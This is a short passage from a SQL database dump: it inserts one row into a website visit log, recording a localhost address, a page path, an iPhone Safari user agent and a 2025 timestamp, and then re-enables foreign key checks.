INSERT INTO `visit_log` VALUES (266, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-03 02:39:11');

SET FOREIGN_KEY_CHECKS = 1;
